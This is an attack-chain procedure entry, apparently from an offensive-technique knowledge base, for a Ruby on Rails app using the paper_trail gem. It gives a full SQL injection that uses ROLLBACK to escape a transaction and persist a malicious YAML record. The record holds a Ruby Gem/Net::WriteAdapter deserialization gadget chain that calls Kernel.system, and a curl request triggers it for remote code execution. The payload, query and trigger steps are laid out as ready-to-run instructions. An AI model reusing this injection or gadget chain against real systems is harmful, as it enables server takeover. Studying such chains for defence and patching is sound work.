---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
tags:
  - sqli
  - rce
  - yaml-deserialization
  - ruby
  - rails
  - postgresql
type: attack_chain
tools:
  - '[[tools/paper_trail]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T12:00:00Z'
procedures:
  - '[[procedures/Access-SQL-Query-Analyzer-Interface]]'
  - '[[procedures/Inject-Malicious-SQL-to-Escape-Transaction-and-Insert-Payload]]'
  - '[[procedures/Trigger-YAML-Deserialization-for-Code-Execution]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Client Execution]]'
updated_at: '2025-12-14T17:29:56.611Z'
description: >-
  Chained SQL injection in an internal query analyzer to escape transactions,
  persist malicious YAML payloads, and trigger deserialization for arbitrary
  Ruby code execution on the server.
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Exploitation for Client Execution]]'
---
---

# SQL Injection in SQL Query Analyzer Escaping Transaction to YAML Deserialization RCE

Multi-stage attack chain demonstrating SQL injection to escape database transactions, persist malicious data, and achieve remote code execution via YAML deserialization in a Ruby on Rails application using the paper_trail gem.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Access Query Analyzer] --> B[SQL Injection and Payload Insertion]
    B --> C[Trigger Deserialization RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/paper_trail]] (vulnerable gem for deserialization)

### Target Environment

- Ruby on Rails application with PostgreSQL database
- Internal support tools accessible (e.g., port 8080)
- Authenticated access as an engineer

### Initial Access Requirements

- Valid credentials for authenticated engineer role
- Network access to internal web interface (localhost:8080 or equivalent)
- No prior access needed beyond authentication

## Detailed Attack Procedures

### Step 1: Access the SQL Query Analyzer Interface
procedure: [[procedures/Access-SQL-Query-Analyzer-Interface]]

**Objective**: Gain access to the vulnerable SQL Query Analyzer feature to prepare for injection.

**Instructions**: Navigate to the SQL Query Analyzer interface in the internal support tools and select the target database connection.

```bash
# No specific command; use browser to access
curl -u <username>:<password> http://localhost:8080/support/sql_query_analyzer
```

Select the 'public' database connection from the interface.

**Expected Output**: Interface loads, allowing input of SQL queries for EXPLAIN ANALYZE.

**Success Indicators**:
- Page loads without errors
- Database connection dropdown visible and 'public' selectable

### Step 2: Inject Malicious SQL to Escape Transaction and Insert Payload
procedure: [[procedures/Inject-Malicious-SQL-to-Escape-Transaction-and-Insert-Payload]]

**Objective**: Exploit SQL injection to rollback the wrapping transaction, insert a malicious YAML payload into the user_versions table, and evade the automatic rollback.

**Instructions**: Submit a crafted SQL query that starts with a benign SELECT, uses ROLLBACK to escape the transaction, inserts the payload, and comments out the rest.

Use the interface to input the following query:

```sql
SELECT 1; ROLLBACK; INSERT INTO user_versions (item_type, item_id, event, email, object) VALUES ('User', 2, 'update', 'uniquekeywordtotriggercode@hackerone.com', '--- username: - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &1 !ruby/object:Net::BufferedIO io: &1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: "abc" debug_output: &1 !ruby/object:Net::WriteAdapter socket: &1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module ''Kernel'' method_id: :system git_set: sleep 600 method_id: :resolve ' ); --
```

Submit for EXPLAIN ANALYZE analysis.

**Expected Output**: Query executes partially; the INSERT persists due to ROLLBACK, but the interface may show analysis for SELECT 1.

**Success Indicators**:
- No immediate errors in the analyzer
- Query to user_versions table shows the inserted record with the email 'uniquekeywordtotriggercode@hackerone.com'

### Step 3: Trigger Deserialization to Execute Arbitrary Code
procedure: [[procedures/Trigger-YAML-Deserialization-for-Code-Execution]]

**Objective**: Query the persisted payload and trigger the reify method to deserialize the YAML, executing the embedded Ruby code.

**Instructions**: Visit the historic users feature endpoint with the trigger email to load and reify the malicious record.

```bash
# Use browser or curl to access
curl http://localhost:8080/support/historic_users?historic_user_input=uniquekeywordtotriggercode@hackerone.com
```

This queries UserVersion by email and calls reify, deserializing the object column.

**Expected Output**: Server executes system('sleep 600'), causing a 600-second delay followed by a 500 error.

**Success Indicators**:
- Request hangs for 600 seconds
- Server logs show code execution attempt
- 500 Internal Server Error after delay

## Attack Chain Summary

### Key Achievements

1. Escaped database transaction via SQL injection in query analyzer
2. Persisted malicious YAML payload in user_versions table
3. Achieved arbitrary Ruby code execution via deserialization in historic users feature

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Exploitation for Client Execution]]

### MITRE ATT&CK Tactics

- [[Execution]]

---

*Last updated: 2023-10-01T12:00:00Z*
